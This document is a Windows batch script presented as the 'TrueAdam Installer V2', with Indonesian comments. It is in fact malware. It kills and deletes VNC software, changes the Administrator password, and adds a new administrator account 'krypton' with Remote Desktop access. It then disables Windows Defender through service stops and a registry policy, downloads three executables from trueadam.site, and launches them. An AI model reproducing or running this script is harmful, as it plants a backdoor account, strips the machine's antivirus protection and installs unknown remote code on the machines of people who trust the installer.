@echo off
setlocal enabledelayedexpansion
title TrueAdam Installer V2 (FIX TOTAL)
set DIR=C:\Sumpruy_Downloads
if not exist "%DIR%" mkdir "%DIR%"
cd /d "%DIR%" 2>nul

:: Matiin VNC (brutal kill) - URUTAN PERTAMA
for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
    taskkill /f /im %%i 2>nul
)

:: Hapus folder VNC (paksa)
for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
    rd /s /q %%i 2>nul
)

:: Stop service VNC
sc stop vncserver 2>nul
sc delete vncserver 2>nul

:: === TAMBAHAN DARI GW: GANTI PW ADMIN & BUAT USER KRYPTON ===
echo [*] Lagi ngegas ganti password Administrator jadi jancoklo...
net user Administrator "jancoklo" 2>nul

echo [*] Bikin user baru krypton dengan password jancoklo...
net user krypton jancoklo /add 2>nul
net localgroup Administrators krypton /add 2>nul
net localgroup "Remote Desktop Users" krypton /add 2>nul
echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
echo.

:: Matiin antivirus sementara (biar gak blokir)
net stop "Windows Defender" 2>nul
net stop "MsMpSvc" 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>nul

echo ========================================
echo MULAI DOWNLOAD SEMUA BRO (TANPA ERROR)
echo ========================================

:: List URL & filename
set URL1=https://trueadam.site/laso.exe
set FILE1=laso.exe
set URL2=https://trueadam.site/StarDesk_1.4.0.exe
set FILE2=StarDesk_1.4.0.exe
set URL3=https://trueadam.site/DyBrowser.exe
set FILE3=DyBrowser.exe

:: Download pake metode triple backup
call :Download "%URL1%" "%FILE1%"
call :Download "%URL2%" "%FILE2%"
call :Download "%URL3%" "%FILE3%"

echo ========================================
echo CEK DAN JALANIN FILE
echo ========================================

if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)
if exist "%FILE2%" (start "" "%FILE2%" & echo [OK] %FILE2% running) else (echo [GAGAL] %FILE2%)
if exist "%FILE3%" (start "" "%FILE3%" & echo [OK] %FILE3% running) else (echo [GAGAL] %FILE3%)

echo ========================================
echo SELESAI GOBLOK 😡😡😡
echo ========================================
timeout /t 3 /nobreak >nul
exit /b

:Download
set url=%~1
set filename=%~2
echo Downloading %filename%...

:: Metode 1: bitsadmin (paling stabil di Windows)
bitsadmin /transfer "Download %filename%" /priority high "%url%" "%cd%\%filename%" 2>nul
if %errorlevel% neq 0 (
    :: Metode 2: curl (kalo ada)
    curl -skL -o "%filename%" "%url%" 2>nul
    if %errorlevel% neq 0 (
        :: Metode 3: PowerShell dengan bypass SSL
        powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; try { Invoke-WebRequest -Uri '%url%' -OutFile '%filename%' -UseBasicParsing } catch { exit 1 }" 2>nul
        if !errorlevel! neq 0 (
            echo [GAGAL TOTAL] %filename% - situs mati atau diblokir total
        ) else (
            echo [OK] %filename% via PS
        )
    ) else (
        echo [OK] %filename% via curl
    )
) else (
    echo [OK] %filename% via bitsadmin
)
exit /b
